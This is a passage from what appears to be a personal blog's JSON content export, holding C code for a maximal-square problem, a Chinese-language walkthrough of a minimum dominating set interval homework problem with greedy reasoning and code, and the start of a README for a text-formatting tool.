class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int min(int a,int b,int c)&#123;</span><br><span class=\"line\">    return (a&lt;((b&lt;c)?b:c)?a:((b&lt;c)?b:c));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int max(int a,int b)&#123;</span><br><span class=\"line\">    if(a &gt; b) return a;</span><br><span class=\"line\">    return b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#define size <span class=\"number\">1000</span></span><br><span class=\"line\">int dps[size][size];</span><br><span class=\"line\">int dph[size][size];</span><br><span class=\"line\">int dpv[size][size];</span><br><span class=\"line\">int maximalSquare(char** matrix, int matrixRowSize, int matrixColSize) &#123;</span><br><span class=\"line\">    if(matrixRowSize == <span class=\"number\">0</span> || matrixColSize == <span class=\"number\">0</span>) return <span class=\"number\">0</span>;</span><br><span class=\"line\">    int maxnum = <span class=\"number\">0</span>;</span><br><span class=\"line\">    int temp;</span><br><span class=\"line\">    if(matrix[<span class=\"number\">0</span>][<span class=\"number\">0</span>] == <span class=\"string\">'1'</span>) temp = <span class=\"number\">1</span>;</span><br><span class=\"line\">    else temp = <span class=\"number\">0</span>;</span><br><span class=\"line\">    dps[<span class=\"number\">0</span>][<span class=\"number\">0</span>] = temp;</span><br><span class=\"line\">    dph[<span class=\"number\">0</span>][<span class=\"number\">0</span>] = temp;</span><br><span class=\"line\">    dpv[<span class=\"number\">0</span>][<span class=\"number\">0</span>] = temp;</span><br><span class=\"line\">    maxnum = max(maxnum,temp);</span><br><span class=\"line\">    for(int i = <span class=\"number\">1</span>;i &lt; matrixColSize;++ i)&#123;//初始化水平方向第一行</span><br><span class=\"line\">        if(matrix[<span class=\"number\">0</span>][i] == <span class=\"string\">'1'</span>)&#123;</span><br><span class=\"line\">            dps[<span class=\"number\">0</span>][i] = <span class=\"number\">1</span>;</span><br><span class=\"line\">            dph[<span class=\"number\">0</span>][i] = dph[<span class=\"number\">0</span>][i - <span class=\"number\">1</span>] + <span class=\"number\">1</span>;</span><br><span class=\"line\">            dpv[<span class=\"number\">0</span>][i] = <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            dps[<span class=\"number\">0</span>][i] = dpv[<span class=\"number\">0</span>][i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            dph[<span class=\"number\">0</span>][i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        maxnum = max(maxnum,dps[<span class=\"number\">0</span>][i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    for(int i = <span class=\"number\">1</span>;i &lt; matrixRowSize;++ i)&#123;//初始化竖直方向第一行</span><br><span class=\"line\">        if(matrix[i][<span class=\"number\">0</span>] == <span class=\"string\">'1'</span>)&#123;</span><br><span class=\"line\">            dps[i][<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">            dph[i][<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">            dpv[i][<span class=\"number\">0</span>] = dpv[i - <span class=\"number\">1</span>][<span class=\"number\">0</span>] + <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            dps[i][<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            dpv[i][<span class=\"number\">0</span>] = dph[i][<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        maxnum = max(maxnum,dps[i][<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    for(int i = <span class=\"number\">1</span>;i &lt; matrixRowSize; ++i)&#123;//开始dp的过程</span><br><span class=\"line\">        for(int j = <span class=\"number\">1</span>;j &lt; matrixColSize;++ j)&#123;</span><br><span class=\"line\">            if(matrix[i][j] == <span class=\"string\">'1'</span>) &#123;//如果这个格子是<span class=\"number\">1</span>，就可以扩展</span><br><span class=\"line\">                dps[i][j] = min(dps[i - <span class=\"number\">1</span>][j - <span class=\"number\">1</span>],dpv[i - <span class=\"number\">1</span>][j],dph[i][j - <span class=\"number\">1</span>]) + <span class=\"number\">1</span>;</span><br><span class=\"line\">                dph[i][j] = dph[i][j - <span class=\"number\">1</span>] + <span class=\"number\">1</span>;</span><br><span class=\"line\">                dpv[i][j] = dpv[i - <span class=\"number\">1</span>][j] + <span class=\"number\">1</span>;</span><br><span class=\"line\">            &#125;else&#123;//不是<span class=\"number\">1</span>就清零</span><br><span class=\"line\">                dps[i][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                dph[i][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                dpv[i][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            maxnum = max(maxnum,dps[i][j]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return maxnum * maxnum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"Minimum Dominating Set","date":"2015-02-03T19:50:26.000Z","_content":"#问题描述#\n![](/image/20150203202449.png)\n<!--more-->\n![](/image/20150203202510.png)\n![](/image/20150203202517.png)\n![](/image/20150203202458.png)\n#解题思路#\n这是个覆盖集的题目，题目的意思是，能够在一个区间集合S中选出来一些个区间，这些个区间集合叫做*Minimun dominating set*, 也就是最小区域集？整个的问题也就是围绕这个定义展开的。\n##a问题##\na问题呢，他定义了一个$I^*$，这个的含义就是他非要在$S$里边挑出来几个区间，组成这个集合。这个集合里边的所有区间都必须在这个Minimun dominating set当中。他让我们证明，就算在Minimun dominating set当中强行加上这个挑出来的集合里边的区域，也可以继续递归的算下去，当作另外一个求$S'$的问题。恩，我们这么说吧。他要求我们给出一个策略，让我们在求解Minimun dominating set的过程当中，这个过程可以递归进行，\n\n接下来呢，我们的策略是这样的：把挑出来的那部分区间，也就是$I^*$,里边的所有区间元素，去掉，并且把不属于这个集合当中的其他区间，和属于这个集合的区间重合的部分修剪掉。上图：\n\n![](/image/20150203204412.png)\n\n上边的图中，我们的$I^*$集合中只包括那个红色的区间。我们需要修剪的就是重合的中间的部分，修剪完后是这样的。\n\n![](/image/20150203204711.png)\n\n剩下的这部分就是$S'$啦，我们只需要继续递归的求解剩下这部分就可以了。如果实在不明白，看b问题吧。\n\n##b问题##\nb问题是这样的，他让我们判断两件事情的正确错误，正确的话证明，错误的话找个反例。\n当然是找反例简单啦，证明多麻烦！所以第一个论断肯定是错误的！（这个因果关系有点奇怪啊）\n第一个论断是这样的：\n>我们在$S$中选择一个最长的，然后用a问题的方法处理掉这个最长的，然后得到$S'$,然后在剩下的$S'$当中，我们继续找最长的处理，递归下去直到结束。\n\n想法倒是挺美好。其实实在是有点问题，找个反例吧～～\n\n![](/image/20150203205237.png)\n\n呐，上边这个图我们看到，红色的是最长的。如果按照这个算法，我们要先选择这个红色的，然后下边连着的那两个区间就被分开了，接下来我们需要选择下排连着的两个区间以及上排右边的区间，一共选择了四个区间。\n好的，正确答案肯定是三个区间就够了，中间那个红色的区间根本没用。\n错误的根本在于，虽然题目的前提要求是这个选出来的区间不能是其他区间的子区间，但是如果其他的两个区间合起来包括了这个区间，也是可能出问题的。\n\n第二个论断是这样的：\n\n>我们在$S$中选择最左边起始区间里边最长的那个，然后用a问题的方式处理这个区间，然后继续递归下去得到结果。\n\n我们不能找反例了，因为这个是正确的。\n因为首先我们看啊，不论如何最开始的$S$区间的最左边一定是要找一个区间的。既然要找，找最大的也没什么影响，然后切割后，剩下的一样，也是要包括最左边的，找最长的那个肯定没错。空口无言，来个图证明一下吧。\n\n![](/image/20150203204253.png)\n\n也没啥说的，至于怎么证明。。只能说这个贪心策略是对的，。。（摊手）\n\n##c问题##\n算法设计嘛，这个最擅长了，也蛮简单的。\n题目是这个样子的，$S$是一大堆区间，$[a_1,b_1][a_2,b_2][a_3,b_3]...$，这里边有个条件，$a_1 {\\le} a_2 {\\le} a_3...$，也就是说每个区间的起始点是单调不递减的。让我们设计一个算法，在$O(n)$的时间复杂度下找出这个Minimun dominating set。\n这个还是挺简单的，而且还给了hint就更没难度了。首先我们只需要找一个标记，算是end吧，这个标记当前过去的这些节点的最后的位置。如果遍历下去发现有一个区间的结束位置比这个end靠前，说明这个区间是不用的，删掉就是了。如果这个区间的结束位置比这个end考前，那么就是结果Minimun dominating set的一部分啦。\n**还有一个需要注意的问题，可能出现起始位置相同，结束位置覆盖的情况，需要在第一遍完成了之后，倒着来一遍去掉这种情况**\n![](/image/20150203212252.png)\n这种情况，如果黄的块第一个选到了，上边的白色的块也会选到。但是很明显下边的块是不需要的，我们需要删除这些重叠的块，这个问题的根源是$a_1 {\\le} a_2$而不是$a_1<a_2$\n代码在下边：\n\n\n```\nstruct interval{\t\t\t\t\t// the defination of basic struct\n\tint start,end;\n}S[MAX];\nint end = -1,start = -1,out[MAX]; \t\t\t// end means the end point of the current loop\n//start used in the second loop, means the start point of the current loop\nmemset(out,0,sizeof(out));\t\t\t\t// initiate the flag part\nfor(int i = 0;i < MAX;++ i){\t\t\t\t// kick out the useless parts\n\tif(S[i].end <= end) out[i] = 1;\n\telse end = S[i].end;\n}\nfor(int i = MAX - 1,i >= 0; --i){\n\tif(!out[i]){\n\t\tif(S[i].start == start) out[i] = 1;\t// kick out the useless parts\n\t\tstart = S[i].start;\n\t}\n}\n```\n\n最后out里边为0的结果就是选择到的Minimun dominating set的元素啦。\n\n算法基于b问题的第二种方法，这是一种正确的方法。因为每个区间的开始位置是不递减的，\n\n\n","source":"_posts/Minimumdominatingset.md","raw":"title: Minimum Dominating Set\ndate: 2015-02-03 19:50:26\ntags: Algorithm\ncategories: Algorithm\n---\n#问题描述#\n![](/image/20150203202449.png)\n<!--more-->\n![](/image/20150203202510.png)\n![](/image/20150203202517.png)\n![](/image/20150203202458.png)\n#解题思路#\n这是个覆盖集的题目，题目的意思是，能够在一个区间集合S中选出来一些个区间，这些个区间集合叫做*Minimun dominating set*, 也就是最小区域集？整个的问题也就是围绕这个定义展开的。\n##a问题##\na问题呢，他定义了一个$I^*$，这个的含义就是他非要在$S$里边挑出来几个区间，组成这个集合。这个集合里边的所有区间都必须在这个Minimun dominating set当中。他让我们证明，就算在Minimun dominating set当中强行加上这个挑出来的集合里边的区域，也可以继续递归的算下去，当作另外一个求$S'$的问题。恩，我们这么说吧。他要求我们给出一个策略，让我们在求解Minimun dominating set的过程当中，这个过程可以递归进行，\n\n接下来呢，我们的策略是这样的：把挑出来的那部分区间，也就是$I^*$,里边的所有区间元素，去掉，并且把不属于这个集合当中的其他区间，和属于这个集合的区间重合的部分修剪掉。上图：\n\n![](/image/20150203204412.png)\n\n上边的图中，我们的$I^*$集合中只包括那个红色的区间。我们需要修剪的就是重合的中间的部分，修剪完后是这样的。\n\n![](/image/20150203204711.png)\n\n剩下的这部分就是$S'$啦，我们只需要继续递归的求解剩下这部分就可以了。如果实在不明白，看b问题吧。\n\n##b问题##\nb问题是这样的，他让我们判断两件事情的正确错误，正确的话证明，错误的话找个反例。\n当然是找反例简单啦，证明多麻烦！所以第一个论断肯定是错误的！（这个因果关系有点奇怪啊）\n第一个论断是这样的：\n>我们在$S$中选择一个最长的，然后用a问题的方法处理掉这个最长的，然后得到$S'$,然后在剩下的$S'$当中，我们继续找最长的处理，递归下去直到结束。\n\n想法倒是挺美好。其实实在是有点问题，找个反例吧～～\n\n![](/image/20150203205237.png)\n\n呐，上边这个图我们看到，红色的是最长的。如果按照这个算法，我们要先选择这个红色的，然后下边连着的那两个区间就被分开了，接下来我们需要选择下排连着的两个区间以及上排右边的区间，一共选择了四个区间。\n好的，正确答案肯定是三个区间就够了，中间那个红色的区间根本没用。\n错误的根本在于，虽然题目的前提要求是这个选出来的区间不能是其他区间的子区间，但是如果其他的两个区间合起来包括了这个区间，也是可能出问题的。\n\n第二个论断是这样的：\n\n>我们在$S$中选择最左边起始区间里边最长的那个，然后用a问题的方式处理这个区间，然后继续递归下去得到结果。\n\n我们不能找反例了，因为这个是正确的。\n因为首先我们看啊，不论如何最开始的$S$区间的最左边一定是要找一个区间的。既然要找，找最大的也没什么影响，然后切割后，剩下的一样，也是要包括最左边的，找最长的那个肯定没错。空口无言，来个图证明一下吧。\n\n![](/image/20150203204253.png)\n\n也没啥说的，至于怎么证明。。只能说这个贪心策略是对的，。。（摊手）\n\n##c问题##\n算法设计嘛，这个最擅长了，也蛮简单的。\n题目是这个样子的，$S$是一大堆区间，$[a_1,b_1][a_2,b_2][a_3,b_3]...$，这里边有个条件，$a_1 {\\le} a_2 {\\le} a_3...$，也就是说每个区间的起始点是单调不递减的。让我们设计一个算法，在$O(n)$的时间复杂度下找出这个Minimun dominating set。\n这个还是挺简单的，而且还给了hint就更没难度了。首先我们只需要找一个标记，算是end吧，这个标记当前过去的这些节点的最后的位置。如果遍历下去发现有一个区间的结束位置比这个end靠前，说明这个区间是不用的，删掉就是了。如果这个区间的结束位置比这个end考前，那么就是结果Minimun dominating set的一部分啦。\n**还有一个需要注意的问题，可能出现起始位置相同，结束位置覆盖的情况，需要在第一遍完成了之后，倒着来一遍去掉这种情况**\n![](/image/20150203212252.png)\n这种情况，如果黄的块第一个选到了，上边的白色的块也会选到。但是很明显下边的块是不需要的，我们需要删除这些重叠的块，这个问题的根源是$a_1 {\\le} a_2$而不是$a_1<a_2$\n代码在下边：\n\n\n```\nstruct interval{\t\t\t\t\t// the defination of basic struct\n\tint start,end;\n}S[MAX];\nint end = -1,start = -1,out[MAX]; \t\t\t// end means the end point of the current loop\n//start used in the second loop, means the start point of the current loop\nmemset(out,0,sizeof(out));\t\t\t\t// initiate the flag part\nfor(int i = 0;i < MAX;++ i){\t\t\t\t// kick out the useless parts\n\tif(S[i].end <= end) out[i] = 1;\n\telse end = S[i].end;\n}\nfor(int i = MAX - 1,i >= 0; --i){\n\tif(!out[i]){\n\t\tif(S[i].start == start) out[i] = 1;\t// kick out the useless parts\n\t\tstart = S[i].start;\n\t}\n}\n```\n\n最后out里边为0的结果就是选择到的Minimun dominating set的元素啦。\n\n算法基于b问题的第二种方法，这是一种正确的方法。因为每个区间的开始位置是不递减的，\n\n\n","slug":"Minimumdominatingset","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681ur000zwypd2dawftb4","content":"<p>#问题描述#<br><img src=\"/image/20150203202449.png\" alt=\"\"><br><a id=\"more\"></a><br><img src=\"/image/20150203202510.png\" alt=\"\"><br><img src=\"/image/20150203202517.png\" alt=\"\"><br><img src=\"/image/20150203202458.png\" alt=\"\"></p>\n<p>#解题思路#<br>这是个覆盖集的题目，题目的意思是，能够在一个区间集合S中选出来一些个区间，这些个区间集合叫做<em>Minimun dominating set</em>, 也就是最小区域集？整个的问题也就是围绕这个定义展开的。</p>\n<p>##a问题##<br>a问题呢，他定义了一个$I^*$，这个的含义就是他非要在$S$里边挑出来几个区间，组成这个集合。这个集合里边的所有区间都必须在这个Minimun dominating set当中。他让我们证明，就算在Minimun dominating set当中强行加上这个挑出来的集合里边的区域，也可以继续递归的算下去，当作另外一个求$S’$的问题。恩，我们这么说吧。他要求我们给出一个策略，让我们在求解Minimun dominating set的过程当中，这个过程可以递归进行，</p>\n<p>接下来呢，我们的策略是这样的：把挑出来的那部分区间，也就是$I^*$,里边的所有区间元素，去掉，并且把不属于这个集合当中的其他区间，和属于这个集合的区间重合的部分修剪掉。上图：</p>\n<p><img src=\"/image/20150203204412.png\" alt=\"\"></p>\n<p>上边的图中，我们的$I^*$集合中只包括那个红色的区间。我们需要修剪的就是重合的中间的部分，修剪完后是这样的。</p>\n<p><img src=\"/image/20150203204711.png\" alt=\"\"></p>\n<p>剩下的这部分就是$S’$啦，我们只需要继续递归的求解剩下这部分就可以了。如果实在不明白，看b问题吧。</p>\n<p>##b问题##<br>b问题是这样的，他让我们判断两件事情的正确错误，正确的话证明，错误的话找个反例。<br>当然是找反例简单啦，证明多麻烦！所以第一个论断肯定是错误的！（这个因果关系有点奇怪啊）<br>第一个论断是这样的：</p>\n<blockquote>\n<p>我们在$S$中选择一个最长的，然后用a问题的方法处理掉这个最长的，然后得到$S’$,然后在剩下的$S’$当中，我们继续找最长的处理，递归下去直到结束。</p>\n</blockquote>\n<p>想法倒是挺美好。其实实在是有点问题，找个反例吧～～</p>\n<p><img src=\"/image/20150203205237.png\" alt=\"\"></p>\n<p>呐，上边这个图我们看到，红色的是最长的。如果按照这个算法，我们要先选择这个红色的，然后下边连着的那两个区间就被分开了，接下来我们需要选择下排连着的两个区间以及上排右边的区间，一共选择了四个区间。<br>好的，正确答案肯定是三个区间就够了，中间那个红色的区间根本没用。<br>错误的根本在于，虽然题目的前提要求是这个选出来的区间不能是其他区间的子区间，但是如果其他的两个区间合起来包括了这个区间，也是可能出问题的。</p>\n<p>第二个论断是这样的：</p>\n<blockquote>\n<p>我们在$S$中选择最左边起始区间里边最长的那个，然后用a问题的方式处理这个区间，然后继续递归下去得到结果。</p>\n</blockquote>\n<p>我们不能找反例了，因为这个是正确的。<br>因为首先我们看啊，不论如何最开始的$S$区间的最左边一定是要找一个区间的。既然要找，找最大的也没什么影响，然后切割后，剩下的一样，也是要包括最左边的，找最长的那个肯定没错。空口无言，来个图证明一下吧。</p>\n<p><img src=\"/image/20150203204253.png\" alt=\"\"></p>\n<p>也没啥说的，至于怎么证明。。只能说这个贪心策略是对的，。。（摊手）</p>\n<p>##c问题##<br>算法设计嘛，这个最擅长了，也蛮简单的。<br>题目是这个样子的，$S$是一大堆区间，$[a_1,b_1][a_2,b_2][a_3,b_3]…$，这里边有个条件，$a_1 {\\le} a_2 {\\le} a_3…$，也就是说每个区间的起始点是单调不递减的。让我们设计一个算法，在$O(n)$的时间复杂度下找出这个Minimun dominating set。<br>这个还是挺简单的，而且还给了hint就更没难度了。首先我们只需要找一个标记，算是end吧，这个标记当前过去的这些节点的最后的位置。如果遍历下去发现有一个区间的结束位置比这个end靠前，说明这个区间是不用的，删掉就是了。如果这个区间的结束位置比这个end考前，那么就是结果Minimun dominating set的一部分啦。<br><strong>还有一个需要注意的问题，可能出现起始位置相同，结束位置覆盖的情况，需要在第一遍完成了之后，倒着来一遍去掉这种情况</strong><br><img src=\"/image/20150203212252.png\" alt=\"\"><br>这种情况，如果黄的块第一个选到了，上边的白色的块也会选到。但是很明显下边的块是不需要的，我们需要删除这些重叠的块，这个问题的根源是$a_1 {\\le} a_2$而不是$a_1&lt;a_2$<br>代码在下边：</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> interval&#123;\t\t\t\t\t<span class=\"comment\">// the defination of basic struct</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> start,<span class=\"built_in\">end</span>;</span><br><span class=\"line\">&#125;S[MAX];</span><br><span class=\"line\"><span class=\"keyword\">int</span> <span class=\"built_in\">end</span> = <span class=\"number\">-1</span>,start = <span class=\"number\">-1</span>,out[MAX]; \t\t\t<span class=\"comment\">// end means the end point of the current loop</span></span><br><span class=\"line\"><span class=\"comment\">//start used in the second loop, means the start point of the current loop</span></span><br><span class=\"line\">memset(out,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(out));\t\t\t\t<span class=\"comment\">// initiate the flag part</span></span><br><span class=\"line\"><span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; MAX;++ i)&#123;\t\t\t\t<span class=\"comment\">// kick out the useless parts</span></span><br><span class=\"line\">\t<span class=\"built_in\">if</span>(S[i].<span class=\"built_in\">end</span> &lt;= <span class=\"built_in\">end</span>) out[i] = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">else</span> <span class=\"built_in\">end</span> = S[i].<span class=\"built_in\">end</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = MAX - <span class=\"number\">1</span>,i &gt;= <span class=\"number\">0</span>; --i)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">if</span>(!out[i])&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">if</span>(S[i].start == start) out[i] = <span class=\"number\">1</span>;\t<span class=\"comment\">// kick out the useless parts</span></span><br><span class=\"line\">\t\tstart = S[i].start;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最后out里边为0的结果就是选择到的Minimun dominating set的元素啦。</p>\n<p>算法基于b问题的第二种方法，这是一种正确的方法。因为每个区间的开始位置是不递减的，</p>\n","excerpt":"<p>#问题描述#<br><img src=\"/image/20150203202449.png\" alt=\"\"><br>","more":"<br><img src=\"/image/20150203202510.png\" alt=\"\"><br><img src=\"/image/20150203202517.png\" alt=\"\"><br><img src=\"/image/20150203202458.png\" alt=\"\"></p>\n<p>#解题思路#<br>这是个覆盖集的题目，题目的意思是，能够在一个区间集合S中选出来一些个区间，这些个区间集合叫做<em>Minimun dominating set</em>, 也就是最小区域集？整个的问题也就是围绕这个定义展开的。</p>\n<p>##a问题##<br>a问题呢，他定义了一个$I^*$，这个的含义就是他非要在$S$里边挑出来几个区间，组成这个集合。这个集合里边的所有区间都必须在这个Minimun dominating set当中。他让我们证明，就算在Minimun dominating set当中强行加上这个挑出来的集合里边的区域，也可以继续递归的算下去，当作另外一个求$S’$的问题。恩，我们这么说吧。他要求我们给出一个策略，让我们在求解Minimun dominating set的过程当中，这个过程可以递归进行，</p>\n<p>接下来呢，我们的策略是这样的：把挑出来的那部分区间，也就是$I^*$,里边的所有区间元素，去掉，并且把不属于这个集合当中的其他区间，和属于这个集合的区间重合的部分修剪掉。上图：</p>\n<p><img src=\"/image/20150203204412.png\" alt=\"\"></p>\n<p>上边的图中，我们的$I^*$集合中只包括那个红色的区间。我们需要修剪的就是重合的中间的部分，修剪完后是这样的。</p>\n<p><img src=\"/image/20150203204711.png\" alt=\"\"></p>\n<p>剩下的这部分就是$S’$啦，我们只需要继续递归的求解剩下这部分就可以了。如果实在不明白，看b问题吧。</p>\n<p>##b问题##<br>b问题是这样的，他让我们判断两件事情的正确错误，正确的话证明，错误的话找个反例。<br>当然是找反例简单啦，证明多麻烦！所以第一个论断肯定是错误的！（这个因果关系有点奇怪啊）<br>第一个论断是这样的：</p>\n<blockquote>\n<p>我们在$S$中选择一个最长的，然后用a问题的方法处理掉这个最长的，然后得到$S’$,然后在剩下的$S’$当中，我们继续找最长的处理，递归下去直到结束。</p>\n</blockquote>\n<p>想法倒是挺美好。其实实在是有点问题，找个反例吧～～</p>\n<p><img src=\"/image/20150203205237.png\" alt=\"\"></p>\n<p>呐，上边这个图我们看到，红色的是最长的。如果按照这个算法，我们要先选择这个红色的，然后下边连着的那两个区间就被分开了，接下来我们需要选择下排连着的两个区间以及上排右边的区间，一共选择了四个区间。<br>好的，正确答案肯定是三个区间就够了，中间那个红色的区间根本没用。<br>错误的根本在于，虽然题目的前提要求是这个选出来的区间不能是其他区间的子区间，但是如果其他的两个区间合起来包括了这个区间，也是可能出问题的。</p>\n<p>第二个论断是这样的：</p>\n<blockquote>\n<p>我们在$S$中选择最左边起始区间里边最长的那个，然后用a问题的方式处理这个区间，然后继续递归下去得到结果。</p>\n</blockquote>\n<p>我们不能找反例了，因为这个是正确的。<br>因为首先我们看啊，不论如何最开始的$S$区间的最左边一定是要找一个区间的。既然要找，找最大的也没什么影响，然后切割后，剩下的一样，也是要包括最左边的，找最长的那个肯定没错。空口无言，来个图证明一下吧。</p>\n<p><img src=\"/image/20150203204253.png\" alt=\"\"></p>\n<p>也没啥说的，至于怎么证明。。只能说这个贪心策略是对的，。。（摊手）</p>\n<p>##c问题##<br>算法设计嘛，这个最擅长了，也蛮简单的。<br>题目是这个样子的，$S$是一大堆区间，$[a_1,b_1][a_2,b_2][a_3,b_3]…$，这里边有个条件，$a_1 {\\le} a_2 {\\le} a_3…$，也就是说每个区间的起始点是单调不递减的。让我们设计一个算法，在$O(n)$的时间复杂度下找出这个Minimun dominating set。<br>这个还是挺简单的，而且还给了hint就更没难度了。首先我们只需要找一个标记，算是end吧，这个标记当前过去的这些节点的最后的位置。如果遍历下去发现有一个区间的结束位置比这个end靠前，说明这个区间是不用的，删掉就是了。如果这个区间的结束位置比这个end考前，那么就是结果Minimun dominating set的一部分啦。<br><strong>还有一个需要注意的问题，可能出现起始位置相同，结束位置覆盖的情况，需要在第一遍完成了之后，倒着来一遍去掉这种情况</strong><br><img src=\"/image/20150203212252.png\" alt=\"\"><br>这种情况，如果黄的块第一个选到了，上边的白色的块也会选到。但是很明显下边的块是不需要的，我们需要删除这些重叠的块，这个问题的根源是$a_1 {\\le} a_2$而不是$a_1&lt;a_2$<br>代码在下边：</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> interval&#123;\t\t\t\t\t<span class=\"comment\">// the defination of basic struct</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> start,<span class=\"built_in\">end</span>;</span><br><span class=\"line\">&#125;S[MAX];</span><br><span class=\"line\"><span class=\"keyword\">int</span> <span class=\"built_in\">end</span> = <span class=\"number\">-1</span>,start = <span class=\"number\">-1</span>,out[MAX]; \t\t\t<span class=\"comment\">// end means the end point of the current loop</span></span><br><span class=\"line\"><span class=\"comment\">//start used in the second loop, means the start point of the current loop</span></span><br><span class=\"line\">memset(out,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(out));\t\t\t\t<span class=\"comment\">// initiate the flag part</span></span><br><span class=\"line\"><span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; MAX;++ i)&#123;\t\t\t\t<span class=\"comment\">// kick out the useless parts</span></span><br><span class=\"line\">\t<span class=\"built_in\">if</span>(S[i].<span class=\"built_in\">end</span> &lt;= <span class=\"built_in\">end</span>) out[i] = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">else</span> <span class=\"built_in\">end</span> = S[i].<span class=\"built_in\">end</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = MAX - <span class=\"number\">1</span>,i &gt;= <span class=\"number\">0</span>; --i)&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">if</span>(!out[i])&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">if</span>(S[i].start == start) out[i] = <span class=\"number\">1</span>;\t<span class=\"comment\">// kick out the useless parts</span></span><br><span class=\"line\">\t\tstart = S[i].start;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最后out里边为0的结果就是选择到的Minimun dominating set的元素啦。</p>\n<p>算法基于b问题的第二种方法，这是一种正确的方法。因为每个区间的开始位置是不递减的，</p>"},{"title":"Myfmt","date":"2015-10-05T22:48:09.000Z","_content":"Author: Song Li\n##AIM##\nThis program is use to do text format things. Users can use this program to limit the width of every line into a particular length and can uniform every blanks.\n<!--more-->\n##USAGE##\nShown as \"--help\", there are two major functions:\n-u to format the text\n-w [length] to limit the width of a line into a\n--h to show the help page\n--v to show the version info\n##COMPILE##\nUsing\n\n> gcc -o fmt.out fmt.c\n\n##FILE STRUCTURE##\n\n>fmt.c: the main code of this program\n>inputjane: the inputfile that I use to test the efficiency\n>HW2 fmt readme.pdf: Document of this program\n\n##RESULT##\n-w [length]: if the original line is longer than the number length, this line will be cut into several lines. After this operation, the maximum length of every line will be the input number “length” and\nevery new line which comes from a same original line will share the same indent just as the original line. They have the same number of leading blanks. And the words will not be separated which means if a word is right at the cut point of the original line, this word will be moved to the next line. So no word will be cut. The default length of every new line is 75.\n-u: if there are more than one blank characters such as ‘ ’, 